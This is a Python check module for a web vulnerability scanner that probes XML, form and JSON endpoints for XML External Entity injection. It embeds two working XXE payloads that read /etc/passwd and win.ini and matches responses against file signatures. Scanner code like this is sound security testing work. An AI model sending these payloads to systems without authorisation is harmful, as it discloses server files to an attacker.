from __future__ import annotations

from icescan.checks.base import BaseCheck
from icescan.core.types import Finding, ScanContext, Surface, SurfaceKind, Severity

XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""

XXE_PAYLOAD_WIN = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>"""

SIGS = ["root:x:0:0", "[extensions]", "[fonts]", "daemon:x:", "nobody:x:"]


class XXE(BaseCheck):
    name = "xxe"
    category = "server"
    level = 3

    def surface_kinds(self):
        return (SurfaceKind.BODY_XML, SurfaceKind.BODY_FORM, SurfaceKind.BODY_JSON)

    async def run_surface(self, ctx, surface):
        for payload in (XXE_PAYLOAD, XXE_PAYLOAD_WIN):
            r = await ctx.client.request(
                surface.method, surface.url,
                content=payload,
                headers={"Content-Type": "application/xml"},
            )
            if r.error:
                continue
            body = r.body or ""
            for sig in SIGS:
                if sig in body:
                    return [self.finding(
                        severity=Severity.CRITICAL,
                        url=r.url, method=surface.method, param=None,
                        payload="xxe external entity",
                        evidence={"signature": sig, "snippet": body[:200]},
                        confidence="high",
                    )]
        return []
